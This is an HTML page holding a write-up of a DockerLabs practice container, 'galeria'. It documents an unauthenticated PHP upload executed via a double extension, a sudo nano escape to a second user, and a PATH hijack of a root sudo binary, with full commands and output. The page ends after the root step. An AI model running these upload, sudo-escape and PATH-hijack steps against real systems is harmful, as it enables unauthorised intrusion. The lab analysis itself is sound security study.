@@ -1,0 +1,774 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 77 galeria &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; galeria</p><h1 id="77-galeria--writeup">77 galeria — writeup</h1>
+<p><strong>Lab:</strong> 77 · <em>galeria</em> · <strong>fácil</strong>
+<strong>Catalogue entry (verbatim, <code>tooling/labs.manifest:82</code>):</strong> <code>77|galeria|facil|simple web fuzzing and a file upload vulnerability</code>
+<strong>Target:</strong> <code>[net-0-5]</code> — single container <code>galeria_container</code>, image <code>galeria:latest</code>.
+<strong>Result:</strong> anonymous → code execution as <strong><code>uid=33(www-data)</code></strong> → <strong><code>uid=1001(gallery)</code></strong> → <strong><code>uid=0(root)</code></strong>, three hops, each identity measured at its own hop and each proved by a root- or gallery-owned artefact read back out of band.
+<strong>No <code>FLAG{}</code></strong> — reported as a measured absence with two independent searches and counts (§9).</p>
+<hr />
+<h2 id="0-the-direct-answer-does-the-upload-class-hold-or-does-this-lab-correct-it">0. The direct answer: does the upload class hold, or does this lab correct it?</h2>
+<p><strong>The class holds, and this lab is the first instance in the corpus where the <em>middle</em> check is both live and load-bearing — which corrects the one generalisation that lab 146's writeup invites you to make.</strong></p>
+<p>The shape the corpus arrived at (lab 12's §0/§10, lab 146's F1) is: <em>the extension allowlist is only one of three independent checks, and they are routinely evaluated on different inputs.</em> That is <strong>confirmed here, in a stronger form</strong>, because the application has <strong>no check at all</strong> and the three-way disagreement therefore happens one level down, between the two server-side checks:</p>
+<table>
+<thead>
+<tr>
+<th>The three checks</th>
+<th>What it is in this artefact</th>
+<th>Verdict from the artefact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. the application's own test</strong></td>
+<td><code>handler.php</code> — <strong>no extension test exists</strong></td>
+<td>accepts <strong>every</strong> name (16 of 16 probed)</td>
+</tr>
+<tr>
+<td><strong>2. the web server's filename map</strong></td>
+<td><code>/etc/apache2/mods-available/php8.3.conf:29-31</code></td>
+<td>executes <code>.php</code> <strong>and</strong> <code>.php.&lt;anything&gt;</code></td>
+</tr>
+<tr>
+<td><strong>3. the filter in between</strong></td>
+<td><code>images/.htaccess:2</code> <code>AddType application/x-httpd-php …</code></td>
+<td>executes <code>.php5</code>, which check 2 <strong>refuses</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The correction, stated precisely.</strong> Lab 146 concluded that a per-directory <code>.htaccess</code> can be the inert one, and the corpus recorded it as &quot;the one that named the exact behaviour was the dead one&quot;. That is true <em>of lab 146</em> — where <code>AllowOverride None</code> had disabled it — and it is <strong>not</strong> a property of <code>.htaccess</code> files. Here <code>sites-enabled/000-default.conf:23-26</code> grants <code>AllowOverride All</code> on the images directory, the file <strong>is</strong> read, and it is the <strong>only</strong> thing that makes <code>.php5</code> execute. The same directive class is dead in one lab and decisive in another. So the rule that survives is narrower and better:</p>
+<blockquote>
+<p><strong>Never decide whether a per-directory file speaks from its content or from its name. Read <code>AllowOverride</code> first, then prove it with a differential — because the same directive is inert in one target and decisive in another, and only the differential tells you which one you are looking at.</strong></p>
+</blockquote>
+<p>And lab 12's better question survives verbatim, with one substitution forced by this artefact: lab 12 asked <em>&quot;do the app's extension test and the server's filename test accept the same name set?&quot;</em> Here there is no app test, so the question has to be asked of the two that remain — <strong>&quot;do the server's filename test and the directory's type test accept the same name set?&quot;</strong> They do not, and §4 measures the disagreement with a four-state differential rather than by reading.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<pre><code>$ nmap -sV -Pn -p- --min-rate 2000 [net-0-5]
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+Not shown: 65533 closed tcp ports (conn-refused)
+</code></pre>
+<p><strong>2 TCP ports, 65 533 closed.</strong> The non-TCP surface was read from <code>/proc</code>, not inferred:</p>
+<pre><code>$ grep -E &quot;:0015|:0050&quot; /proc/net/tcp        # 0015=21  0050=80, state 0A = LISTEN
+   0: 00000000:0050 00000000:0000 0A …
+   1: 00000000:0015 00000000:0000 0A …
+$ cat /proc/net/udp
+    sl  local_address rem_address  st …      # header only — 0 UDP sockets bound
+</code></pre>
+<p><code>nmap -sU</code> was not attempted (needs root, unavailable on this host). The corroboration ladder I do have: the image's declared <code>EXposedPorts</code> are exactly <code>{&quot;21/tcp&quot;:{},&quot;80/tcp&quot;:{}}</code>, <code>/proc/net/tcp</code> shows exactly those two listeners, and <code>/proc/net/udp</code> is empty. A UDP service is possible in principle and I have no evidence against one; I simply could not look.</p>
+<p><code>ss</code> is <strong>not installed</strong> in this image. My first &quot;listener count&quot; was <code>ss -lnt | wc -l</code> → <strong>0</strong>, which is <code>sh: ss: command not found</code> wearing a zero — see §8.1.</p>
+<hr />
+<h2 id="2-what-the-artefact-actually-is--and-was-the-manifests-label-right">2. What the artefact actually is — and was the manifest's label right?</h2>
+<p>Read from version-bearing files and the package database, before any request that mattered.</p>
+<pre><code>$ docker inspect -f 'ENTRYPOINT={{json .Config.Entrypoint}} EXPOSED={{json .Config.ExposedPorts}}' galeria:latest
+ENTRYPOINT=[&quot;/etc/.netd-entry&quot;] EXPOSED={&quot;21/tcp&quot;:{},&quot;80/tcp&quot;:{}}
+
+$ head -3 /etc/os-release
+PRETTY_NAME=&quot;Ubuntu 24.04.1 LTS&quot;
+NAME=&quot;Ubuntu&quot;
+
+$ dpkg -l apache2 php8.3 libapache2-mod-php8.3 vsftpd | grep ^ii
+ii  apache2               2.4.58-1ubuntu8.5      amd64  Apache HTTP Server
+ii  libapache2-mod-php8.3 8.3.6-0ubuntu0.24.04.3 amd64  server-side, HTML-embedded scripting language (Apache 2 module)
+ii  vsftpd                3.0.5-0ubuntu3.1       amd64  lightweight, efficient FTP server built for security
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Axis</th>
+<th>Manifest says</th>
+<th>Artefact says</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Class</td>
+<td><em>&quot;simple web fuzzing and a file upload vulnerability&quot;</em></td>
+<td>one unauthenticated upload endpoint at a non-guessable-but-fuzzable path, <strong>plus a second write primitive on FTP that the catalogue does not mention</strong>, plus a two-hop sudo ladder</td>
+<td><strong>right, and incomplete</strong></td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>(not named)</td>
+<td>Ubuntu 24.04.1, Apache httpd 2.4.58, PHP 8.3.6 <code>mod_php</code>, vsftpd 3.0.5</td>
+<td>—</td>
+</tr>
+<tr>
+<td>Service count</td>
+<td>(not named)</td>
+<td><strong>two</strong> listeners, not one web port</td>
+<td><strong>the FTP half is undeclared</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The manifest's label is a filename, and here it is not wrong</strong> — which is itself worth saying, because rule 1 of the brief is about the queue's <em>platform</em> label being wrong three times out of five. What the label is wrong about is <strong>completeness</strong>: the entry names one vulnerability and the image ships a three-hop chain. The upload is the <em>entry</em>, not the finding.</p>
+<p>The entrypoint is the whole configuration:</p>
+<pre><code class="language-bash"># /etc/.netd-entry, in full
+#!/bin/bash
+service apache2 start
+service vsftpd start
+tail -f /dev/null
+</code></pre>
+<p><code>auto_deploy.sh</code> was <strong>read, never run</strong> (it ends in <code>while true; do sleep 1; done</code> at line 145). It creates <strong>no network</strong>: a bare <code>docker run -d --name $CONTAINER_NAME $IMAGE_NAME</code> at line 131, one container, no macvlan, no <code>--internal</code>, no second host. The engagement stayed single-host.</p>
+<hr />
+<h2 id="3-source-read-before-the-first-request-that-mattered">3. Source read before the first request that mattered</h2>
+<p>The whole application is three files, and all three fit in one screen.</p>
+<pre><code class="language-php"># /var/www/html/gallery/uploads/handler.php, in full — 17 lines
+ 1  &lt;?php
+ 2  if (isset($_FILES['image'])) {
+ 3      $upload_dir = __DIR__ . '/images/';
+ 4      $upload_file = $upload_dir . basename($_FILES['image']['name']);
+ 5
+ 6      if (move_uploaded_file($_FILES['image']['tmp_name'], $upload_file)) {
+ 7          echo &quot;Archivo subido exitosamente: &quot; . htmlspecialchars($_FILES['image']['name']);
+ 8      } else {
+ 9          echo &quot;Error al subir el archivo.&quot;;
+10      }
+11  }
+12  ?&gt;
+</code></pre>
+<p><strong>Read what this code does not say.</strong> There is no <code>pathinfo</code>, no extension allowlist, no <code>getimagesize()</code>, no <code>finfo</code>, no content sniff, no size cap, no session, no token, no rate limit. The stored name is <code>basename()</code> of the client-supplied name, so the attacker controls the name completely. <code>basename()</code> does neutralise traversal — measured, not assumed (§6) — but a name it cannot shorten is still an arbitrary name.</p>
+<pre><code class="language-apache"># /var/www/html/gallery/uploads/images/.htaccess, in full — 11 lines
+ 1  # Forzar ejecución como PHP si termina en .php o .php.*
+ 2  AddType application/x-httpd-php .php .php5 .php.jpg .php.jpeg .php.png .php.gif .php.webp
+ 3
+ 4  # Permitir servir cualquier tipo de archivo normalmente
+ 5  AddType image/jpeg .jpeg .jpg
+ 6  AddType image/png .png
+ 7  AddType image/gif .gif
+ 8  AddType image/webp .webp
+ 9
+10  # Opcional: evitar listado de archivos
+11  Options +Indexes
+</code></pre>
+<p>The comment on line 10 says <em>&quot;Opcional: evitar listado de archivos&quot;</em> — <strong>avoid listing of files</strong> — and the directive <strong>enables</strong> it. That is the same class of decoy lab 146 found, in a single line, and it is a comment that names the opposite of what it does.</p>
+<pre><code class="language-apache"># /etc/apache2/mods-available/php8.3.conf:29-31  (the operative directive)
+29  &lt;FilesMatch &quot;\.php(\..+)?$&quot;&gt;
+30      SetHandler application/x-httpd-php
+31  &lt;/FilesMatch&gt;
+</code></pre>
+<p>Lines 1–27 of that file are the stock Ubuntu <code>mod_php</code> configuration. <strong>Lines 29–31 are not</strong>, and that is not recall — it is the package's own checksum database:</p>
+<pre><code>$ dpkg -S /etc/apache2/mods-available/php8.3.conf
+libapache2-mod-php8.3: /etc/apache2/mods-available/php8.3.conf
+
+$ dpkg -V libapache2-mod-php8.3
+??5?????? c /etc/apache2/mods-available/php8.3.conf
+
+$ dpkg -V php8.3 ; echo &quot;rc=$?&quot;          # the WRONG package: silent
+rc=0
+</code></pre>
+<p><code>??5??????</code> is <code>dpkg</code>'s field layout: the <strong>md5sums</strong> field (position 5) and nothing else. The file was modified after <code>dpkg</code> installed it. Two things follow, and both are reusable:</p>
+<ul>
+<li><code>dpkg -V &lt;wrong-package&gt;</code> is silent and exits 0. The first <code>dpkg -V php8.3</code> I ran &quot;verified&quot; this file clean because the file belongs to <code>libapache2-mod-php8.3</code>, not <code>php8.3</code>. <strong>A verifier pointed at the wrong package is a verifier that has not looked</strong> — the same root as <code>self-corrections.md</code> §11–§14, reached a new way.</li>
+<li><code>dpkg -V</code> over the whole tree returns <strong>5 490 lines</strong>, almost all <code>missing /usr/share/doc/...</code> and <code>missing /usr/share/man/...</code> from image slimming. A sweep that noisy needs a filter, and the filter needs a positive control.</li>
+</ul>
+<hr />
+<h2 id="4-the-three-checks-and-the-four-state-differential-that-decides-between-them">4. The three checks, and the four-state differential that decides between them</h2>
+<h3 id="the-name-matrix--9-names-every-fetch-anonymous-with-no-cookie-jar">The name matrix — 9 names, every fetch anonymous with <strong>no cookie jar</strong></h3>
+<p>Payload = PHP that prints <code>posix_getuid()</code>, <code>php_sapi_name()</code> and <code>/proc/self/status</code>. Uploaded with <code>curl -F</code>, fetched with a bare <code>curl</code> that has never seen a cookie.</p>
+<table>
+<thead>
+<tr>
+<th>Stored name</th>
+<th><code>POST</code> result</th>
+<th><code>GET</code> status</th>
+<th><code>Content-Type</code> served</th>
+<th>Verdict</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>poc3.php</code></td>
+<td><code>Archivo subido exitosamente</code></td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td><strong>EXECUTED</strong> <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>poc3.php.jpg</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td><strong>EXECUTED</strong> <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>poc3.php5</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td><strong>EXECUTED</strong> <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>poc3.phtml</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td><strong>EXECUTED</strong> <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>poc3.css.php</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td><strong>EXECUTED</strong> <code>uid=33</code></td>
+</tr>
+<tr>
+<td><code>poc3.jpg</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>image/jpeg</code></td>
+<td>served verbatim, 690 B, <strong>not executed</strong></td>
+</tr>
+<tr>
+<td><code>poc3.css</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/css</code></td>
+<td>served verbatim, 690 B, <strong>not executed</strong></td>
+</tr>
+<tr>
+<td><code>poc3.txt</code></td>
+<td>accepted</td>
+<td><code>200</code></td>
+<td><code>text/plain</code></td>
+<td>served verbatim, 690 B, <strong>not executed</strong></td>
+</tr>
+<tr>
+<td><code>poc3.phps</code></td>
+<td>accepted</td>
+<td><code>403</code></td>
+<td>—</td>
+<td>denied by the stock <code>Require all denied</code> on <code>\.phps$</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>9 of 9 accepted by the application.</strong> There is no application check, so check 1 accepts the whole universe. Every execution verdict above is the <em>product of the two server-side checks</em>, and they are the ones that disagree.</p>
+<h3 id="four-state-differential--the-same-five-files-changing-only-the-state-of-imageshtaccess">Four-state differential — the same five files, changing only the state of <code>images/.htaccess</code></h3>
+<p>Shipped file: <code>362</code> B, <code>www-data:www-data 644</code>, <code>md5 ead3bfa54720efca3b7bd38bc94b27d8</code>.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>A: shipped</th>
+<th>B: stripped to <code>Options +Indexes</code> only</th>
+<th>C: deleted</th>
+<th>D: restored byte-exact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>poc.php</code></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+</tr>
+<tr>
+<td><code>poc.php.jpg</code></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+<td><strong>EXECUTED</strong></td>
+</tr>
+<tr>
+<td><code>poc.php5</code></td>
+<td><strong>EXECUTED</strong></td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+<td><strong>EXECUTED</strong></td>
+</tr>
+<tr>
+<td><code>poc.jpg</code></td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+</tr>
+<tr>
+<td><code>poc.txt</code></td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+<td>served verbatim</td>
+</tr>
+</tbody>
+</table>
+<p>Read the table as two separate findings, because they are two:</p>
+<ul>
+<li><strong><code>.php</code> and <code>.php.jpg</code> execute in all four states</strong> ⇒ the cause is <strong>not</strong> in the upload directory. It is <code>php8.3.conf:29-31</code>, which is global. Confirmed by placing the same payload where no <code>.htaccess</code> applies at all: <code>GET /dl77_docroot.php.jpg</code> → <code>200</code>, <code>text/html</code>, <strong>executed</strong>; <code>GET /gallery/uploads/dl77_up.php.jpg</code> → <strong>executed</strong>.</li>
+<li><strong><code>.php5</code> flips</strong> ⇒ <code>images/.htaccess</code> <strong>is</strong> read (<code>AllowOverride All</code>, <code>sites-enabled/000-default.conf:23-26</code>) and <strong>is</strong> load-bearing. The filename map <code>\.php(\..+)?$</code> refuses <code>.php5</code>; the <code>AddType application/x-httpd-php .php5</code> on line 2 of the <code>.htaccess</code> is the only thing that executes it.</li>
+</ul>
+<p><strong>The two checks disagree on exactly one name in my matrix, and the name where they disagree is the name that works.</strong> That is lab 12's contribution, relocated one level down.</p>
+<h3 id="the-options-indexes-line-is-inert">The <code>Options +Indexes</code> line is inert</h3>
+<pre><code>state A (shipped .htaccess):   GET /gallery/uploads/images/ -&gt; 200  12657 B
+.htaccess absent:              GET /gallery/uploads/images/ -&gt; 200  12651 B
+restored:                      GET /gallery/uploads/images/ -&gt; 200  12657 B
+</code></pre>
+<p>The listing survives without it, because <code>apache2.conf:170-174</code> already sets <code>Options Indexes</code> on <code>/var/www/</code>. <strong>So the upload directory ships two directives that look protective and one that is protective: the <code>.htaccess</code> is half-live.</strong> Line 2 of it is decisive; line 11 is decorative; the comment above line 11 states the opposite of what line 11 does.</p>
+<hr />
+<h2 id="5-three-states-in-one-directory--uploaded-and-executed-are-different-claims">5. Three states in one directory — &quot;uploaded&quot; and &quot;executed&quot; are different claims</h2>
+<p>Lab 12's measurement discipline, repeated here. All four rows are the same 690-byte payload, the same directory, the same session, fetched anonymously.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Name</th>
+<th>On disk</th>
+<th>HTTP</th>
+<th><code>Content-Type</code></th>
+<th>Body</th>
+<th>What it proves</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>poc3.php</code></td>
+<td>690 B, <code>www-data:www-data 644</code></td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td>114 B of <code>posix_getuid()</code> output</td>
+<td><strong>the engine runs inside <code>images/</code></strong></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>poc3.php.jpg</code></td>
+<td>690 B, <code>www-data:www-data 644</code></td>
+<td><code>200</code></td>
+<td><code>text/html; charset=UTF-8</code></td>
+<td>114 B</td>
+<td><strong>a double extension executes</strong> — the lab's own new state</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>poc3.jpg</code></td>
+<td>690 B</td>
+<td><code>200</code></td>
+<td><code>image/jpeg</code></td>
+<td>the PHP <strong>source, verbatim</strong>, 690 B</td>
+<td><strong>uploaded, not executed</strong> — PHP inside a <code>.jpg</code> is data</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>poc3.txt</code></td>
+<td>690 B</td>
+<td><code>200</code></td>
+<td><code>text/plain</code></td>
+<td><code>NOT-PHP</code>-equivalent, 690 B</td>
+<td><strong>positive control</strong>: the path is reachable and the fetch is not lying</td>
+</tr>
+</tbody>
+</table>
+<p>Row 3 is the one that keeps the claim honest. <strong>A 200 that renders a 690-byte page is not execution</strong> — rows 3 and 4 are also 200s, and the discriminator is the <em>body</em>, not the status.</p>
+<p>Row 2's <code>Content-Type</code> is worth a second look: it is <code>text/html</code>, <strong>not</strong> <code>image/jpeg</code>, even though <code>.htaccess:5</code> maps <code>.jpg</code> to <code>image/jpeg</code>. <code>SetHandler</code> overrides the type. The served type tells you nothing about who won.</p>
+<hr />
+<h2 id="6-controls-that-held-and-the-fuzzing-half">6. Controls that held, and the fuzzing half</h2>
+<h3 id="the-impossible-name-control-ran-first-and-the-sweep-is-therefore-trustworthy">The impossible-name control ran <strong>first</strong>, and the sweep is therefore trustworthy</h3>
+<p>Lab 87's phantom-301 shape did <strong>not</strong> occur here, and the reason is that the control was measured before the sweep, not after:</p>
+<pre><code>CONTROL /zzq7x9f2a-nonexistent-control-8f2a91/deep.html -&gt; (404, 'text/html; charset=iso-8859-1', 272, 'c9ed091c5471')
+</code></pre>
+<p>272 bytes, <code>404</code>, and a body hash that is <strong>distinct from every other response in the run</strong>. Any name the sweep reported is a deviation from <em>that</em>, not from nothing.</p>
+<h3 id="wordlist-sweep--69-names--2-prefixes--138-requests-6-deviations">Wordlist sweep — 69 names × 2 prefixes = <strong>138 requests</strong>, 6 deviations</h3>
+<pre><code>  /.htaccess                                (403, 275 B, 22ef8c435b79)
+  /gallery/uploads/.htaccess                (403, 275 B, 22ef8c435b79)
+  /gallery/uploads/handler.php              (200, 148 B, b2df19900435)   &lt;- the entry point
+  /gallery/uploads/images                   (200, autoindex)
+  /index.html                               (200, 1772 B)
+  /server-status                            (403, 275 B)                &lt;- mod_status loaded but restricted
+
+tested=138 candidates=69 deviations_from_control=6
+</code></pre>
+<p>The three <code>403</code>s are <strong>byte-identical</strong> (<code>22ef8c435b79</code>) — they are one Apache error page reached three ways, not three different verdicts. <code>/server-status</code> is a real module (<code>mods-enabled/status.load</code>) answering a real restriction; that is a <em>scanner</em> result about <code>mod_status</code>, not a finding.</p>
+<p><strong>Path traversal was tested and did not work</strong>, with a positive control on the same code path (<code>basename()</code>, <code>handler.php:4</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Sent <code>filename=</code></th>
+<th>Server's confirmation message</th>
+<th>On disk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>../../../tmp/DL77trav.php</code></td>
+<td><code>Archivo subido exitosamente: DL77trav.php</code></td>
+<td><code>DL77trav.php</code> inside <code>images/</code></td>
+</tr>
+<tr>
+<td><code>....//....//tmp/DL77trav2.php</code></td>
+<td><code>Archivo subido exitosamente: DL77trav2.php</code></td>
+<td><code>DL77trav2.php</code> inside <code>images/</code></td>
+</tr>
+<tr>
+<td><code>/tmp/DL77trav*</code></td>
+<td>—</td>
+<td><strong>does not exist</strong> (0 files)</td>
+</tr>
+</tbody>
+</table>
+<p><code>basename()</code> holds. Reported as a control that held, not as an absence.</p>
+<h3 id="arbitrary-overwrite-of-a-shipped-asset--and-of-the-htaccess-itself">Arbitrary overwrite of a shipped asset — and of the <code>.htaccess</code> itself</h3>
+<pre><code>before: 0b5131aa6eb53a9f4cf52f5673f90537  image_1.jpg
+after : 4515b8d3da094c65311ae482cf49a402  image_1.jpg   (26 B: &quot;GIF89a-OVERWRITTEN-BY-DL77&quot;)
+</code></pre>
+<p><code>move_uploaded_file</code> truncates in place, so the endpoint overwrites any <code>www-data</code>-owned file in <code>images/</code>. The same primitive with <code>filename=&quot;.htaccess&quot;</code> replaced the 362-byte control with 690 bytes of my own PHP. That is F2, and it is also my worst instrumentation defect (§8.4).</p>
+<h3 id="the-sudo-grant-is-properly-scoped--four-negative-controls-one-positive">The sudo grant is properly scoped — four negative controls, one positive</h3>
+<pre><code>$ sudo -n -l                                    # as www-data, read inside the uploaded script
+Matching Defaults entries for www-data on bcd2d5855d9a:
+    env_reset, mail_badpass, use_pty
+
+User www-data may run the following commands on bcd2d5855d9a:
+    (gallery) NOPASSWD: /bin/nano
+    (www-data) NOPASSWD: /bin/nano
+
+  sudo -n -u gallery /bin/bash -c id    -&gt;  sudo: a password is required
+  sudo -n -u gallery /usr/bin/id        -&gt;  sudo: a password is required
+  sudo -n -u root     /bin/nano --version -&gt; sudo: a password is required
+  sudo -n -u www-data /bin/nano --version -&gt; GNU nano, version 7.2      &lt;- POSITIVE
+  sudo -n -l -U gallery                  -&gt;  Sorry, user www-data is not allowed to execute 'list' as gallery …
+</code></pre>
+<p>Scoped to <strong>one target user</strong> and <strong>one program</strong>, and the detector discriminates: three denies and one grant on the same predicate in the same shell. Note there is <strong>no <code>secure_path</code></strong> in effect for <code>www-data</code> (<code>sudo -n -l</code> shows no <code>secure_path</code> default) and <code>%sudo</code>/<code>%admin</code> do not list <code>www-data</code>.</p>
+<hr />
+<h2 id="7-the-chain--three-hops-uideuid-at-every-one-each-proved-out-of-band">7. The chain — three hops, <code>uid</code>/<code>euid</code> at every one, each proved out of band</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof (verbatim, at the hop)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>anonymous</td>
+<td>unauthenticated multipart <code>POST</code> to <code>/gallery/uploads/handler.php</code>; name is attacker-chosen; no filter</td>
+<td>no session exists to prove — there is no auth at all</td>
+</tr>
+<tr>
+<td>1</td>
+<td><code>uid=33(www-data)</code></td>
+<td><code>poc.php.jpg</code> stored in <code>images/</code> and executed by <code>php8.3.conf:29-31</code></td>
+<td><code>PROC|Uid: 33 33 33 33</code>, <code>POSIXUID=33 POSIXEUID=33</code>, <code>SAPI=apache2handler</code>, <code>shell_exec('id')</code> → <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></td>
+</tr>
+<tr>
+<td>1b</td>
+<td>(second writer) <code>uid=101(ftp)</code></td>
+<td>anonymous FTP <code>STOR</code> into the pre-seeded <code>ftp/</code> subdirectory</td>
+<td>on-disk owner <code>ftp:ftp 644</code>; <code>getent passwd ftp</code> → <code>ftp:x:101:103:…</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>uid=1001(gallery)</code></td>
+<td><code>sudo -n -u gallery /bin/nano</code> (grant, no argument list ⇒ any argv) → nano <code>^T Execute</code></td>
+<td>artefact <code>/tmp/DL77_esc.txt</code> owned <code>gallery:gallery</code>, contents <code>uid=1001(gallery) gid=1001(gallery) groups=1001(gallery)</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>uid=0(root)</code></td>
+<td><code>sudo -n /usr/local/bin/runme</code> as <code>gallery</code>; <code>runme</code> is a <strong>driver</strong> that <code>system()</code>s the bare name <code>convert</code>; <code>PATH</code> is hijacked so <code>convert</code> resolves to a file <code>gallery</code> owns</td>
+<td>artefact <code>/tmp/DL77_root.txt</code> owned <strong><code>root:root</code></strong>, contents <code>uid=0(root) gid=0(root) groups=0(root)</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="hop-0--1-in-full-anonymous-and-cookieless">Hop 0 → 1, in full, anonymous and cookieless</h3>
+<pre><code>$ curl -F &quot;image=@payload2.php;filename=poc_final.php.jpg&quot; http://[net-0-5]/gallery/uploads/handler.php
+Archivo subido exitosamente: poc_final.php.jpg
+
+$ curl -s http://[net-0-5]/gallery/uploads/images/poc_final.php.jpg
+PROC|Uid:	33	33	33	33
+PROC|Gid:	33	33	33	33
+PROC|Groups:	33
+PROC|CapEff:	0000000000000000
+PROC|CapBnd:	000000000a80425fb
+PROC|NoNewPrivs:	0
+PROC|Seccomp:	2
+POSIXUID=33 POSIXEUID=33
+SAPI=apache2handler
+SCRIPT=/var/www/html/gallery/uploads/images/poc_final.php.jpg
+ST_OWNER=33
+ST_MODE=644
+</code></pre>
+<p><strong><code>Uid: 33 33 33 33</code> is real, effective, saved and filesystem — all four — so there is no setuid transition at this hop</strong>, and <code>CapEff</code> is all zeros. <code>NoNewPrivs: 0</code> and <code>Seccomp: 2</code> are recorded because they decide whether hop 2 or 3 could gain anything.</p>
+<p><strong>Oracle manufactured before it was trusted.</strong> The execution is the result, but the <em>write</em> needed its own proof, so the payload also wrote a uniquely-marked file into a path only the Apache identity can create, and I read it back twice — as root and as <code>www-data</code>:</p>
+<pre><code>$ docker exec galeria_container ls -l /tmp/DL77MARK-8f3a2c17b4.proof
+-rw-r--r-- 1 www-data www-data 42 Sep 30 14:45 /tmp/DL77MARK-8f3a2c17b4.proof
+$ docker exec -u www-data galeria_container cat /tmp/DL77MARK-8f3a2c17b4.proof
+DL77MARK-8f3a2c17b4 uid=33 time=1790801111
+</code></pre>
+<h3 id="hop-2--3-with-a-paired-control-in-a-single-run">Hop 2 → 3, with a paired control <strong>in a single run</strong></h3>
+<p><code>/usr/local/bin/runme</code> is <code>740 root:gallery</code>, 16 000 B, an ELF whose only two library calls are <code>puts</code> and <code>system</code>. Read as <code>gallery</code> (the group has <code>r--</code>), its strings are the whole mechanism:</p>
+<pre><code>Converting image...
+convert /var/www/html/gallery/uploads/images/input.png /var/www/html/gallery/uploads/images/output.jpg
+Done.
+</code></pre>
+<p>The command is <strong>hardcoded</strong> — no arguments reach it, so argument injection is off the table. What reaches it is the <strong>name</strong> <code>convert</code>, resolved through <code>PATH</code>. And the sudoers file, quoted in full from the artefact, has the two decisions that make that fatal:</p>
+<pre><code class="language-apache"># /etc/sudoers
+# Defaults	secure_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin&quot;
+Defaults:gallery        env_keep += &quot;PATH&quot;
+Defaults	use_pty
+…
+gallery ALL=(ALL) NOPASSWD: /usr/local/bin/runme
+…
+www-data ALL=(gallery) NOPASSWD: /bin/nano
+www-data ALL=(www-data) NOPASSWD: /bin/nano
+</code></pre>
+<p><code>secure_path</code> is <strong>commented out</strong>; <code>env_keep += &quot;PATH&quot;</code> is <strong>active, scoped to <code>gallery</code></strong>. So <code>gallery</code> chooses the prefix list, and <code>runme</code> — running as <code>uid=0</code> — resolves its subprogram out of it. One run, both arms:</p>
+<pre><code>whoami=gallery PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+--- planted ---
+-rwxr-xr-x 1 gallery gallery 463 Sep 30 14:54 /tmp/dl77p/convert
+--- control: runme with the normal PATH ---
+sh: 1: convert: not found
+Converting image...
+Done.
+rc=0
+--- treatment: runme with /tmp/dl77p prepended ---
+Converting image...
+Done.
+rc=0
+--- artifact? ---
+-rw-r--r-- 1 root root 1285 Sep 30 14:54 /tmp/DL77_root.txt
+</code></pre>
